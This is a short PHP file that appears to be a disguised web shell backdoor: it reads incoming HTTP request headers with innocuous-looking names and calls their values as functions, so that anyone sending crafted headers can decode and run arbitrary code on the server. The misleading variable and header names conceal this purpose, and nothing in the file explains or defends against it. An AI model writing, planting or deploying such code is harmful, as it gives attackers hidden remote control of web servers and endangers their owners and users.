<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $mb_convert = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Large-Allocation']));
    $mb_convert();
}